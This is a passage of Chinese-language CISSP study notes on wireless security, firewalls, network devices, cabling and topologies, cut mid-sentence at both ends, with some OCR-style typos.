包括独立模式、有线扩展模式、企业扩展模式和桥接模式。独立模式指无线接入点连接无线客户端但是没有提供任何有线资源。无线接入点服务就像一个无线交换机。有线扩展模式指无线接入点连接无线客户端到有线网络。企业扩展模式指多个无线接入点(WAP)用来连接巨大的物理区域到同一个有线网络。每一个无线接入点都使用相同的扩展服务集标识符(ESSID)， 因此客户端能在更换区域时保持网络连接， 即使它们的无线阿卡从一个无线接入点到另一个无线接入点改变关联。桥接模式发生在当无线连接用于连接两个有线网络的情况，这通常发生在有线桥接不方便时。</p><h4 id="11-5-2-保护SSID"><a href="#11-5-2-保护SSID" class="headerlink" title="11.5.2 保护SSID"></a>11.5.2 保护SSID</h4><p>　　SSID广播由WAP通过信标帧进行特殊传输。它允许在无线覆盖范围内的任意无线网卡尽可能简单地进行无线网络连接。然而， 这个默认的SSID广播应禁用以便保持无线网络的私密性。即便如此， 攻击者仍然可以用无线嗅探器借由无线客户端和WAP之间的传输发现SSID。因此， 禁用SSID广播并不是一个真正的安全机制。相反， 应使用WPA2作为一个可靠的身份认证和加密解决方案而不是试图隐藏无线网络的存在。</p><h4 id="11-5-3-执行现场勘测"><a href="#11-5-3-执行现场勘测" class="headerlink" title="11.5.3 执行现场勘测"></a>11.5.3 执行现场勘测</h4><p>　　用于发现不需要无线接入的物理环境区域的一种方法是执行现场勘测。现场勘测的过程是调查在环境中部署无线接入点所需的信号强度。这项任务通常包括携带便携式无线设备进行现场行走观察， 留意无线信号的强度， 并据此在建筑图上进行标注。执行现场勘测来确保无线设备使用的所有位置具备足够的信号强度， 同时在同一时间， 最大限度地减少或消除不允许无线接入位置(公共区域、跨楼层、其他房间或建筑夕阳的无线信号。现场勘测对于评估现有无线网络的部署、扩展当前应用的计划以及未来部署计划非常有用。</p><h4 id="11-5-4-使用加密协议"><a href="#11-5-4-使用加密协议" class="headerlink" title="11.5.4 使用加密协议"></a>11.5.4 使用加密协议</h4><ul><li><strong>WEP</strong> 有线等效保密(WEP)被定义为IEEE 802.11标准， 目的在于为无线网络提供与有线或通信电缆网络相同级别的安全性和加密。WEP提供无线传输保护中对数据包嗅探和窃听攻击的防护。它可以被配置来防止未经授权的无线网络访问。WEP使用预定义的共享密钥， 然而并非典型的动态对称密码方案， 共享密钥是静态的并在所有的无线接入点和设备接口之间进行共享。此密钥用于在无线链路传输之前加密数据包， 从而提供机密性保护。哈希值用来验证接收的数据包在传输过程中不被修改或遭受损坏。因此， WEP也提供完整性保护。WEP在发布的同时几乎就被破解。</li><li><strong>WPA</strong>WPA 基于LEAP和TKIP加密体系并通常使用安全加密用于认证。遗憾的是， 使用单个静态的密码将彻底损坏WPA的安全性。攻击者可以简单地在WPA网络中运行暴力猜测攻击以发现密码。如果密码是14位字符或更长， 这通常是时间问题， 但并非不可能无法破解。此外， 无论是WPA的LEAP还是TKIP加密选工页， 目前都可以使用不同的破解技术进行破解。尽管WPA比WEP更复杂，但WPA不再提供长期可靠的安全。</li><li><strong>WPA2</strong>一种新的确保无线安全的方法被开发出来， 井且截至目前仍然被认为是安全的。这就是被称为802.11i或WPA2的修订方案。这是一种新的加密方案， 称为计数器模式密码块链接消息认证码协议(Counter Mode Cipher Block Chaining Message Authentication Code Protocol， CCMP)， 这是基于AES的加密方案。到目前为止， 还没有实际的攻击能破坏正确配置的WPA2无线网络加密。</li><li><strong>802.1X/EAP</strong> WPA 和WPA2 都支持称为企业认证的802.1X/EAP ， 这是一个标准的基于端口的网络访问控制协议， 确保客户端在没有发生正确认证时不能和资源发生通信联系。802.1X是一种有效允许无线网络利用现有的网络基础设施进行认证服务的协议。通过使用802.1x ， 其他技术和解决方案， 如RADIUS、TACACS、证书、智能卡、令牌和生物识别设备， 可以被集成到无线网络中并提供包括进行交互和多因子认证的技术。EAP(Extensible Authentication Protocol， 可扩展认证协议)是认证框架而不是具体的认证机制。实际上， EAP可以允许新的认证技术与现有无线或点对点连接技术兼容。</li><li><strong>PEAP</strong> PEAP(protected EAP， 受保护的可扩展认证协议)通过TLS隧道封装EAP方法， 提供了认证和潜在的加密功能。由于EAP最初被设计用于在物理上隔离通道， 因此假定固定通路， EAP通常是不加密的。所以， PEAP可以为EAP方法提供加密。</li><li><strong>LEAP</strong> LEAP(Lightweight EAP， 轻量级可扩展认证协议)是Cisco专有的， 用于WPA替代TKIP。在802.11i/WAP2系统被批准为标准之前， 它被开发用于应对TKIP地址不足的情况。一种称为Asleap的攻击工具在2004年发布， 该工具可以破解LEAP提供的最终脆弱保护。如果可能， 应尽量避免使用LEAP并建议使用EAP-TLS作为一种替代。但如果己使用LEAP， 强烈推荐使用复杂的密码。</li><li><strong>MAC过滤器</strong> MAC过滤器是一系列授权的无线客户端接口MAC地址， 这些地址被无线接入点用来阻断那些未经授权的设备。虽然这是一个有用的特性， 但是它难以管理， 并且往往只使用在小型、静态的环境中。此外， 黑客通过基本的无线黑客工具就可以发现有效客户端的MAC地址， 然后伪装成该地址对无线客户端发起攻击。</li><li><strong>TKIP</strong> TKIP(Temporal Key Integrity Protocol， 临时密钥完整性协议)被设计为替代WEP而不需要更换无线硬件。TKIP在无线网络802.11 WPA的名称下得到应用。TKIP改进了很多， 包括密钥的混合功能， 该功能在使用RC4算法密钥进行加密之前结合了初始向量(IV， 一个随机数)与安全的根密钥;一个序列计数器被用来防止报文重放攻击; 同时还使用了一种强大的称为Michael的完整性检查。</li><li><strong>CCMP</strong>CCMP(计数器模式密码块链接消息认证码协议)用于取代WEP和TKIP/WPA。CCMP使用AES(高级加密标准)和128位的密钥。CCMP是802.11i制定的在802.11无线网络中首选的标准安全协议。到目前为止， 还没有攻击能成功破解AES/CCMP加密。</li></ul><h4 id="11-5-5-天线位置的确定"><a href="#11-5-5-天线位置的确定" class="headerlink" title="11.5.5 天线位置的确定"></a>11.5.5 天线位置的确定</h4><p>　　在部署无线网络时， 天线位置应该是一个值得关注的问题。不要在适当的现场勘测完成之前就固定到一个特定的位置。将无线接入点和/或它的天线放置在一个可能的位置， 然后测试不同位置的信号强度和连接质量。只有在确认该潜在的天线位置提供了令人满意的连接后， 才应该进行永久性的固定。在寻找最佳天线位置时应考虑以下准则:</p><ul><li>使用中央位置</li><li>避开固体物理障碍物</li><li>避开反射或其他平整的金属表面</li><li>避开电气设备</li></ul><h4 id="11-5-6-天线类型"><a href="#11-5-6-天线类型" class="headerlink" title="11.5.6 天线类型"></a>11.5.6 天线类型</h4><p>　　有很多各种各样的天线类型可用于无线客户端和基站。许多设备可以用更强的(例如， 信号增强)天线替代原有的标准天线。标准的直杆或杆天线是一种全向天线， 可以在垂直于天线本身的方向上发送和接收信号。在大多数基站和一些客户端设备上可发现这种天线类型。这种类型的天线有时也被称为基础天线或橡胶天线(事实上大多数天线由橡胶涂层覆盖)。</p><h4 id="11-5-7-调整功率水平控制"><a href="#11-5-7-调整功率水平控制" class="headerlink" title="11.5.7 调整功率水平控制"></a>11.5.7 调整功率水平控制</h4><p>　　一些无线接入点提供了物理或逻辑调整天线功率水平的功能。功率控制通常由厂家设定为适用于大多数的情况。但是， 如果在进行现场勘测和调整天线位置后， 无线信号仍然无法令人满意， 功率水平调整可能是必要的。然而， 要记住改变信道， 避免反射和信号散射表面以减少干扰， 往往可以更有效地改善连接可靠性。<br>　　当调整功率水平时， 要进行微调， 而不是试图将设置最大化或最小化。此外， 需要注意初始/默认设置以便必要时可以返回到该设置。在每一次功率水平调整后， 在重新进行现场勘测和质量测试之前重置/重新启动无线接入点。有时降低功率水平可以提高性能。需要记住， 一些无线接入点能够提供比一些国家许可规定更高的功率水平。</p><h4 id="11-5-8-使用强制门户"><a href="#11-5-8-使用强制门户" class="headerlink" title="11.5.8 使用强制门户"></a>11.5.8 使用强制门户</h4><p>　　强制门户是一种认证技术， 它将新连接的无线Web 客户端重定向到强制门户访问控制页面。这个门户页面可能需要用户输入付款信息、提供登录凭据或输入访问代码。强制门户也被用来给用户显示可访问的使用策略、隐私策略和跟踪策略， 用户必须同意策略才能接入网络进行通信。</p><h4 id="11-5-9-一般的Wi-Fi安全措施"><a href="#11-5-9-一般的Wi-Fi安全措施" class="headerlink" title="11.5.9 一般的Wi-Fi安全措施"></a>11.5.9 一般的Wi-Fi安全措施</h4><ul><li>改变默认的管理员密码。</li><li>关闭SSID广播。</li><li>变更SSID到特定的方式。</li><li>如果无线客户端比较少且是静态的， 启用MAC过滤。</li><li>考虑使用静态IP地址， 或配置保留的DHCP(仅适用于小型部署)。</li><li>开启支持的身份认证和加密的最高形式。如果不提供WPA2， 那么使用WPA和WEP提供非常有限的保护也比未加密的网络好得多。</li><li>把无线视为远程访问， 并使用802.1x进行访问管理。</li><li>把无线视为外部接入， 把WAP和有线网络用防火墙进行隔离。</li><li>把无线视为攻击者的入口， 用IDS监控所有WAP到有钱网络的通信流量。</li><li>需要对无线客户端和WAP之间的通信进行加密， 换句话说， 需要VPN连接。</li></ul><h3 id="11-6-保护网络组件"><a href="#11-6-保护网络组件" class="headerlink" title="11.6 保护网络组件"></a>11.6 保护网络组件</h3><p>　　网络通常不被配置为单一的大集合系统。通常网络被分隔或细分成较小的组织单位。这些更小的单位、分组、分段或子网络(即子网)可以用来提高网络的各个方面:</p><ul><li><strong>提高性能</strong> 网络分隔可以通过组织方案提高性能， 这样经常通信的系统位于同一个网段， 而很少或无任何通信的系统位于其他网段。</li><li><strong>减少通信</strong> 网络分隔往往能减少通信拥塞和容纳通信问题， 如广播风暴、单独的网络分段。</li><li><strong>提高安全性</strong> 网络分隔可提高安全性， 可通过隔离数据流以及需要用户接入认证的网络段来加以实现。</li></ul><p>　　可以通过基于交换机的VL刷、路由器或防火墙抑或它们的组合进行网络分隔。私有局域网或内部网、DMZ 和外部网都是网络分隔的类型。</p><h4 id="11-6-1-网络接入控制"><a href="#11-6-1-网络接入控制" class="headerlink" title="11.6.1 网络接入控制"></a>11.6.1 网络接入控制</h4><p>　　网络接入控制(NAC)是一种访问控制环境中通过严格遵守和实施安全策略的概念。NAC领域的目标如下:</p><ul><li>预防/减少0-day攻击</li><li>加强网络通信的安全策略</li><li>使用验证完成访问控制</li></ul><p>　　NAC 的目标可以通过使用强大且详细的安全策略来达到。这些措施明确了从客户端到服务器以及所有内部或外部沟通中每台设备的安全控制、过滤、预防、检测和响应。NAC作为一种自动检测和响应系统， 可以实时反应， 在威胁引起损坏或破坏之前就对其进行阻断。<br>　　NAC 可以通过进入前评估方式或进入后评估方式， 或结合这两种方式进行应用:</p><ul><li>进入前评估方式需要系统满足当前的安全要求(如应用补丁和杀毒软件更新)才被允许与网络进行通信。</li><li>进入后评估方式基于用户的活动允许访问或拒绝访问， 是预定义的授权矩阵</li></ul><p>　　其他围绕NAC的问题包括客户端/系统代理与整体网络监控(非代理); 带外与带内监测; 以及分解任何补救、隔离或强制门户策略。这些和其他的NAC问题必须在实施之前进行考虑和评估。</p><h4 id="11-6-2-防火墙"><a href="#11-6-2-防火墙" class="headerlink" title="11.6.2 防火墙"></a>11.6.2 防火墙</h4><p>　　防火墙是管理和控制网络通信的必要工具。防火墙是一种用于过滤通信的网络设备， 并且通常部署在专用网络与互联网的连接之间， 也可以部署在公司内的不同部门之间。防火墙基于己定义的一组规则(也被称为过滤器或访问控制列表)对通信进行过滤。这些规则本质上是一组指令， 这组指令被用于区分己授权的通信和非授权的或恶意的通信。只有己授权的通信才被允许通过防火墙所提供的安全屏障。防火墙被用于阻止或过滤通信。针对未请求的通信和从外部连接专用网络的企图， 以及基于内容、应用、协议、端口或源地址来阻止己知的恶意数据、消息或数据包， 防火墙都是最有效的。防火墙能够对公共网络隐藏专用网络的结构和寻址方案。大多数防火墙都提供广泛的日志记录、审计和监控性能， 以及警报和基本的入侵检测系统(IDS) 功能。<br>　　防火墙通常不能阻止通过其他己授权通信信道传送的病毒或恶意代码， 不能防止未授权的但由用户无意或有意造成的信息泄漏， 不能防范防火墙之后的恶意用户所进行的攻击， 也不能在数据离开或进入专用网络之后对其进行保护。不过， 可以通过特殊的插件模块或同类产品(例如， 防病毒扫描装置和IDS工具)来添加这些功能。这些防火墙设备可通过预设配置去执行所有(或大多数)附加功能。除了记录网络通信活动之外， 防火墙还应当记录下面这些事件:</p><ul><li>防火墙的重启</li><li>无法启动的代理或依赖服务</li><li>崩溃或重新启动的代理或其他重要服务</li><li>对防火墙配置文件的更改</li><li><p>防火墙运行时的配置或系统错误</p></li><li><p><strong>静态的数据包过滤防火墙</strong>  静态的数据包过滤防火墙通过检查报文头部的数据进行通信过滤。通常， 过滤规则关注于源地址、目的地址和端口地址。使用静态过滤时， 防火墙不能为用户提供身份认证， 也不能告知数据包来自专用网络内部还是外部， 并且很容易受到虚假数据包的欺骗。静态的数据包过滤防火墙被称为第一代防火墙， 在OSI模型的第3层(网络层)上工作。此外， 这种防火墙也被称为屏蔽路由器或常用路由器。</p></li><li><strong>应用级网关防火墙</strong>  应用级网关防火墙也被称为代理防火墙。代理是一种可以将数据包从一个网络复制到另一个网络的机制: 为了保护内部或专用网络的身份， 复制过程还改变了源地址和目的地址。应用级网关防火墙基于用于传送或接收数据的网络服务(也就是应用)来过滤通信。每种应用类型都必须具有自己唯一的代理服务器。因此， 应用级网关防火墙包括很多独立的代理服务器。由于每个信息数据包在通过防火墙时都必须经过检查和处理， 因此这种类型的防火墙对于网络的性能会产生负面影响。应用级网关防火墙被称为第二代防火墙， 并且在OSI模型的应用层(第7层)上工作。</li><li><strong>电路级网关防火墙</strong>  电路级网关防火墙用于在可信合作伙伴之间建立通信会话， 在OSI模型的会话层(第5层)上工作。SOCKS(来自安全套接字， 就像TCP/IP端口一样)是电路级网关防火墙的通用实现。电路级网关防火墙也称为电路代理， 在电路的基础上管理通信， 而不是基于通信的内容管理通信。这种防火墙只基于通信电路的终点名称(也就是源地址、目的地址以及服务端口号)来许可或拒绝转发决策。因为它们代表对应用级网关防火墙概念的更改， 所以电路级网关防火墙仍然被视为第二代防火墙。</li><li><strong>状态检测防火墙</strong>  状态检测防火墙(也被称为动态包过滤防火墙)对网络通信的状态或环境进行评估。通过查看源地址和目的地址、应用习惯、起源地以及当前数据包与同一会话先前数据包之间的关系， 状态检测防火墙就能够为己授权的用户和活动授予广泛的访问权限， 并且能够积极地监视和阻止未授权的用户和活动。状态检测防火墙通常比应用级网关防火墙更有效。状态检测防火墙被视为第三代防火墙， 并且在OSI 模型的网络层和传输层(第3层和第4层)上工作。</li></ul><h5 id="1-多宿主防火墙"><a href="#1-多宿主防火墙" class="headerlink" title="1. 多宿主防火墙"></a>1. 多宿主防火墙</h5><p>　　某些防火墙系统具有多个接口。例如， 多宿主防火墙必须至少具有两个过滤通信的接口(具有两个接口的防火墙被称为双宿主防火墙)。应该禁用所有多宿主防火墙的IP转发功能， 以便使过滤规则控制所有通信， 而非允许接口之间存在软件支持的捷径。堡垒主机或屏蔽主机只是位于专用网络和不可信网络之间的防火墙系统。通常， 堡垒主机位于连接专用网络和不可信网络的路由器之后。所有入站通信都被路由至堡垒主机， 随后堡垒主机作为专用网络内所有可信系统的代理。堡垒主机不仅负责过滤进入专用网络的通信， 而且还负责保护内部客户端的身份。屏蔽子网位于两个路由器之间， 并且堡垒主机就位于这个子网内， 除此之外， 屏蔽子网与屏蔽主机(也就是堡垒主机)在概念上相似。所有入站通信都被定向至堡垒主机， 并且只有白堡垒主机代理的通信才能够通过第二个路由器进入专用网络。这种方式会创建一个子网，在该子网内， 某些外部访问者被允许与网络提供的资源进行通信。上面介绍的就是DMZ的概念， DMZ是一个被设计为外部访问者能够访问的网络区域， 不过这个区域仍然与组织的专用网络相隔离。DMZ常常是公共Web、电子邮件、文件以及其他资源服务器的宿主。</p><h5 id="2-防火墙部署的体系结构"><a href="#2-防火墙部署的体系结构" class="headerlink" title="2. 防火墙部署的体系结构"></a>2. 防火墙部署的体系结构</h5><p>　　防火墙部署的体系结构一般有三种:单层、双层和三层(也被称为多层)。<br><img src="/notes/cissp学习笔记（11）——网络安全架构与保护网络组件/防火墙部署的三种体系结构.png"></p><p>　　单层部署将专用网络置于防火墙之后， 防火墙通过路由器连接互联网(或者其他某些不可信网络)。单层部署只用于针对一般的攻击。这种体系结构只提供最低限度的保护。<br>　　双层部署体系结构可能采用两种不同的设计方式之一。一种设计使用一个具有三个或更多个接口的防火墙， 另一种设计则串联使用两个防火墙。这种体系结构允许存在一个DMZ或公共可访问的外部网。在第一种设计中， DMZ位于主防火墙的其中一个接口; 而在第二种设计中， DMZ位于两个串联的防火墙之间。DMZ用于驻留外部用户能够访问的信息服务器系统。防火墙根据其严格的过滤规则将通信路由至DMZ或可信网络。这种体系结构引入了中等级别的路由和过滤复杂性。<br>　　三层部署体系结构是在专用网络与互联网之间用防火墙隔离的多个子网部署。后续的每个防火墙都使用更严格的过滤规则， 只接受可信来源的通信。最外面的子网往往是DMZ。中间的子网可以作为事务处理子网， 在这种子网内， 系统需要支持在DMZ中驻留的复杂的Web应用程序。第三个或后端子网能够支持专用网络。这种体系结构是最安全的， 不过其设计、实现和管理也是最复杂的。</p><h4 id="11-6-3-终端安全"><a href="#11-6-3-终端安全" class="headerlink" title="11.6.3 终端安全"></a>11.6.3 终端安全</h4><p>　　终端安全的概念是指每个单独设备必须维护本地安全， 不论其网络或通信信道是否提供安全。传统的安全取决于网络的边界入口， 通过诸如应用防火墙、代理服务器、集中式病毒扫描程序，甚至是IDS/IPS/IDP解决方案来为网络中的所有内部节点提供安全保障。这已经不被认为是最佳行业实践， 因为内部威胁和外部威胁一样多。网络的安全取决于其最薄弱的元素。终端安全应视为在每个单独主机上提供足够安全努力的一个方面。每个系统都应该有合适的安全组合， 包含本地主机防火墙、反恶意软件扫描、身份认证、授权、审计和垃圾邮件过滤器以及IDS/IPS服务。</p><h4 id="11-6-4-其他网络设备"><a href="#11-6-4-其他网络设备" class="headerlink" title="11.6.4 其他网络设备"></a>11.6.4 其他网络设备</h4><ul><li><strong>中继器、集中器和放大器</strong> 中继器、集中器和放大器用于加强线缆段上的通信信号以及连接使用相同协议的网段。通过在较长的线缆上部署一个或多个中继器， 这些设备就能用于延长特定线缆类型的最大长度。中继器、集中器和放大器在OSI模型的第1层上工作。中继器、集中器或放大器两侧的系统都位于相同的冲突域和广播域内。</li><li><strong>集线器</strong> 集线器用于连接多个系统以及连接使用相同协议的网段。它们将入站通信在所有出站端口上进行中继。这确保了通信将到达预计的主机。集线器是一种多端口的中继器， 它在OSI模型的第1层上工作。集线器两侧的系统都位于同一冲突域和广播域内。大多数组织有非集线器的安全策略来限制或减少窃听的风险， 因为集线器是一种过时的技术， 交换机己替代它们。</li><li><strong>调制解调器</strong> 传统的陆线调制解调器(调制器-解调器)是一种通信装置， 其在模拟信号和数字信息之间进行覆盖或调制， 以支持在公共电话网络(PSTN)线路上进行计算机通信。在20世纪60年代到90年代中期， 调制解调器通常指广域网通信。调制解调器后来被包括ISDN、DSL 调制解调器、电缆调制解调器、802.11无线调制解调器以及各种形式的无线调制解调器的数字宽带技术替代。</li><li><strong>桥</strong> 桥用于将两个网络(即使是拓扑结构、线缆连接类型和速度不同的网络)连接在一起， 以便连接使用相同协议的网段。桥将通信从一个网络转发至另一个网络。将使用不同传输速率的网络连接在一起的桥可以缓存数据包， 直至这些数据包被转发至较慢的网络， 这被称为存储转发设备。桥在OSI模型的第2层上工作。桥两侧的系统位于相同的广播域内， 不过所在的冲突域不同。</li><li><strong>交换机</strong> 如果不使用集线器， 那么可以考虑使用交换机或智能集线器。交换机知道在每个出站端口上连接的系统的地址。与在所有出站端口上中继通信不同， 交换机只在己知存在的目的地所在的出站端口外对通信进行中继。交换机能够更有效地进行流量传递、建立隔离的冲突域以及提高数据的总体吞吐量。在用于创建VLAN时， 交换机也可以创建隔离的广播域。如果采用这样的配置，那么广播只允许在单个VLAN内， 不允许从一个VLAN顺利地穿越至另一个VLAN。交换机主要在OSI模型的第2层上工作。当交换机具有额外的功能时(如路由)， 那么也可以在OSI模型的第3层上工作(例如， 在VLAN之间进行路由的情况)。在第2层上工作的交换机， 其两侧的系统位于同一广播域内， 不过所在的冲突域不同。在第3层上工作的交换机， 其两侧的系统位于不同的广播域和冲突域内。交换机用于连接使用相同协议的网段。</li><li><strong>路由器</strong> 路由器用于控制网络上的通信流， 井常用来连接相似的网络以及控制两者之间的通信流。路由器既可以利用静态定义的路由表进行工作， 也可以采用动态的路由系统。动态的路由协议有很多种， 例如RIP、OSPF和BGP。路由器在OSI模型的第3层上工作。路由器两侧的系统属于不同的广播域和冲突域。路由器用于连接使用相同协议的网段。</li><li><strong>桥式路由器</strong> 桥式路由器是一种由路由器和桥组成的组合设备。桥式路由器首先尝试路由， 如果路由失败， 那么就默认进行桥接。因此， 桥式路由器主要在OSI模型的第3层上工作， 不过必要时也可以在第2层上工作。在第3层上工作的桥式路由器， 其两侧的系统位于不同的广播域和冲突域内。在第2层上工作的桥式路由器， 其两侧的系统位于相同的广播域内， 不过所在的冲突域不同。桥式路由器用于连接使用相同协议的网段。</li><li><strong>网关</strong> 网关能够连接使用不同网络协议的网络。通过将通信的格式转换为与每个网络采用的协议或传输方法都兼容的形式， 网关就可以负责从一个网络向另一个网络传输通信信息。网关也被称为协议转换器， 既可以作为独立硬件设备， 也可以作为一种软件服务(例如， IP-to-IPX网关)。网关两侧的系统位于不同的广播域和冲突域内。网关用于连接使用不同协议的网段。网关具有很多类型，包括数据、邮件、应用、安全和互联网。网关通常在OSI模型的第7层上工作。</li><li><strong>代理</strong> 代理是一种不需要在协议之间进行转换的网关。相反， 代理能够充当网络的中介、过滤器、缓存服务器甚至NATIPAT服务器。代理代表另一个系统执行操作或请求服务， 并且连接使用相同协议的网段。代理最常被用于为专用网络中的客户端提供互联网访问， 同时又保护客户端身份的环境中。代理从客户端接受请求， 更改请求者的源地址， 维持与客户端请求的映射， 并且将更改过的请求数据包发出。这种机制就是通常所说的网络地址转换(NAT)。一旦接收到回应， 代理服务器就会通过查看映射来决定预定的客户端， 然后将数据包发送给该客户端。代理两侧的系统位于不同的广播域和冲突域内。</li><li><strong>LAN扩展</strong> LAN扩展是一种远程访问的多层交换机， 用于通过WAN 链接连接远距离网络。令人奇怪的是， LAN扩展会创建WAN， 但是经销商却避开使用WAN术语， 而是只使用LAN和扩展的LAN来称呼这种设备。之所以这样做的原因是: 标准的W剧设备与复杂的概念和术语联系在一起， 采用LAN术语能够使人们更容易理解这种设备， 并且更容易开展营销工作。最终， LAN扩展是与WAN交换机或WAN路由器相同的产品(我们同意Douglas Adams的观点， 他坚信应当用宇宙飞船将销售人员、律师和电话推销人员运送到宇宙的最远端) 。</li></ul><h3 id="11-7-布线、无线、拓扑和通信技术"><a href="#11-7-布线、无线、拓扑和通信技术" class="headerlink" title="11.7 布线、无线、拓扑和通信技术"></a>11.7 布线、无线、拓扑和通信技术</h3><h4 id="11-7-1-网络布线"><a href="#11-7-1-网络布线" class="headerlink" title="11.7.1 网络布线"></a>11.7.1 网络布线</h4><h5 id="1-同轴电缆"><a href="#1-同轴电缆" class="headerlink" title="1. 同轴电缆"></a>1. 同轴电缆</h5><p>　　同轴电缆(coaxial cable 或coax)是20世纪70年代和80年代流行的网络连线类型。同轴电缆的中心是一根铜线， 外面包着一层绝缘物质， 再往外是一层导电的编织屏蔽物， 并且由最外面的绝缘外皮包裹着。由于线缆中央的铜芯和编织屏蔽层作为两根独立的导线， 因此准许在同轴电缆上进行双向通信。同轴电缆的设计使其能够完全抵抗电磁干扰(EMI)， 能够支持高带宽(对比同时代的其他技术)， 并且提供比双绞线更长的可用长度。同轴电缆需要使用网段终结器， 而双绞线则不需要。同轴电缆具有两种主要类型: 细缆和粗缆。细缆也被称为10Base2， 通常用来将系统连接到粗缆主干线路。细缆可以扩展到185米的距离， 并且能够提供高达10Mbps的吞吐率。粗缆也被称为10Base5， 可以扩展到500米的距离， 并且能够提供高达10Mbps的吞吐率。同轴电缆的常见问题如下:</p><ul><li>同轴电缆的弯曲会超出最大弧形半径， 从而破坏中心导线</li><li>部署同轴电缆的长度超过推荐的最大长度(10Base2的最大长度为185米， 10Base5的最大长度为500米)</li><li>在同轴电缆末端没有正确使用50欧姆电阻器</li></ul><h5 id="2-基带和宽带线缆"><a href="#2-基带和宽带线缆" class="headerlink" title="2. 基带和宽带线缆"></a>2. 基带和宽带线缆</h5><p>　　标记大多数网络连线技术所使用的命名规则都道，从语法”XXyyyyZZ”。XX表示线路类型所提供的最大速度， 例如10Base2线路提供的最大速率为10MbPS。yyyy表示线路的基带或宽带特性，例如10Base2线缆的基带特性。基带线缆一次只能传输一个单独的信号， 宽带线缆则可以同时传输多个信号。绝大多数网络连线都采用基带线缆。然而， 在特定的配置中使用时， 同轴电缆可以被用作宽带连接， 例如线缆调制解调器。ZZ既可以表示线缆所能提供的最大应用距离， 也可以表示线缆技术的速记形式， 例如10Base2线缆可以提供大约200米的距离(实际上是185米，近似为200米)，10Base-T或100Base-TX中的T或四表示双绞线(需要注意的是， 100Base-TX使用两条5类UTP或STP线路实现， 一条用于接收， 另一条用于发送)。</p><h5 id="3-双绞线"><a href="#3-双绞线" class="headerlink" title="3. 双绞线"></a>3. 双绞线</h5><p>　　与同轴电缆相比， 双绞线相当细， 而且非常灵活。双绞线由4对线缆组成， 这4对线双绞在一起， 并且被包在PVC绝缘皮内。如果在外皮之下、线缆的周围包有一层金属箔片， 那么这条线就被称为屏蔽双绞线(STP)。这层金属箔片对外部EMI提供了额外保护。没有这层金属箔片的双绞线被称为非屏蔽双绞线(UTP)。<br>　　UTP和STP的线缆由细铜线组成， 它们被成对地双绞在一起。线缆的缠绕可以使线缆免受外部的无线电频率干扰、电子干扰和磁性干扰， 并且降低了线对之间的串扰。由于电流会产生电磁辐射，因此一组线会被另一组线感应， 这样在数据传输时就会发生串扰。线缆中的每个线对都以不同的程度进行缠绕(也就是每英寸距离内进行缠绕) ， 这样当信号在一对线上传递时， 就不会交错到另一对线上。缠绕得越紧(每英寸进行的缠绕越多)， 那么对内部和外部干扰以及串扰的屏蔽也就越强， 因此吞吐的能力也就越大(也就是说， 具有更大的带宽)。UTP线缆有几种类型。不同的种类来自于使用的线对缠绕的松紧、导线的质量和外部绝缘层的<br>质量，如下：</p><table><thead><tr><th>UTP类别</th><th>吞吐率</th><th>说明</th></tr></thead><tbody><tr><td>1类</td><td>只用于语音</td><td>不适用于网络， 但是可用于调制解调器</td></tr><tr><td>2类</td><td>4Mbps</td><td>不适用于大多数网络， 常常用于大型机中的主机到终端的连接</td></tr><tr><td>3类</td><td>10Mbps</td><td>主要用于10Base-T以太网(在令牌环网中只提供4Mbps的吞吐率)</td></tr><tr><td>4类</td><td>16Mbps</td><td>主要用于令牌环网</td></tr><tr><td>5类</td><td>100Mbps</td><td>用于10Base-TX、FDDI和ATM网络</td></tr><tr><td>6类</td><td>155Mbps</td><td>用于高速网络</td></tr><tr><td>7类</td><td>10Gbps</td><td>用于千兆速率的网络</td></tr></tbody></table><p>　　下面列出了使用双绞线的最常见问题:</p><ul><li>使用错误的双绞线线缆类型来完成高吞吐率的网络连接</li><li>部署的双绞线线缆长度超过推荐的最大长度(也就是100米)</li><li>在具有显著干扰的环境中使用UTP</li></ul><h5 id="4-导线"><a href="#4-导线" class="headerlink" title="4. 导线"></a>4. 导线</h5><p>　　导线型网络线缆的距离受到金属导线电阻的限制。作为最常用的导线， 铜线是最好、最便直的可用于室温环境下的一种导线。然而， 铜线对于电流还是存在电阻， 这使得信号的强度和质量在超出线缆的长度时会降低。每种线缆类型定义的最大长度， 指的是在哪一点信号降低的程度开始对数据传输的有效性产生干扰。信号的这种降低被称为衰减。在使用中， 结缆的长度常常可能超出定额， 但是错误和重传的数量将在这条线缆上增加， 最终会导致网络的性能变得很差。随着传输速率的提高， 衰减将表现得更加显著。如果要提高传输速率， 建议大家使用较短的线缆。<br>　　距离长的钱缆常常可以通过使用中继器或集中器得到补充。中继器是一个信号放大设备， 它更像是车载或家用录音机的放大器。中继器将输入数据流的信号强度增大， 然后从它的另一个端口重新广播出去。除了具有两个以上的端口之外， 集中器与中继器进行同样的操作。但是， 连续使用的中继器不能多于4个。</p><h4 id="11-7-2-网络拓扑"><a href="#11-7-2-网络拓扑" class="headerlink" title="11.7.2 网络拓扑"></a>11.7.2 网络拓扑</h4><ul><li><p><strong>环型拓扑结构</strong> 环型拓扑结构将每个系统像圆周上的点一样连接在一起。连接介质像一条单向的传输环。每次只有一个系统可以传输数据。传输管理通过一个令牌实现。令牌是一个数字通行证， 它绕着环运动， 直至被系统捕获。拥有令牌的系统能够传输数据。数据和令牌被传送到特定的目的地。在数据绕环传递时， 每个系统都要查看自己是否就是数据的预定接收者。如果不是， 则继续传递令牌。如果是， 则读取数据。一旦数据被接收， 令牌即被释放， 并且返回到环中继续绕行， 直到被另一个系统捕获。如果环中的任意一段出现故障， 那么所有的绕环通信都将终止。为了防止单点故障， 某些环型拓扑结构的实现采用了容错机制， 例如反向运行的双环。</p><img src="/notes/cissp学习笔记（11）——网络安全架构与保护网络组件/环型拓扑结构.png"></li><li><p><strong>总线型拓扑结构</strong>总线型拓扑结构将每个系统都连接到一条主干线或骨干线。总线上所有的系统都可以同时传输数据， 这样就可能导致突。当两个系统同时传输数据时， 就会出现冲突， 信号会相互产生干扰。为了避免这种情况的发生， 系统采用冲突避免机制， 这种机制主对当前其他任意的通信进行”侦昕”。如果侦听到通信， 那么系统会等待片刻并再次进行侦听。如果没有侦听到通信， 那么系统就传输其数据。当数据在总线型拓扑结构上进行传输时，网络上的所有系统都在侦昕这些数据。如果数据的目的地址不是某个特定的系统， 那么该系统就会忽略这个数据。总线型拓扑结构的好处在于， 如果单个网段出现了故障， 那么其他所有网段上的通信仍然能够继续进行而不被中断。不过， 中央干线仍然存在着单点故障隐患。总结型拓扑结构有两种类型: 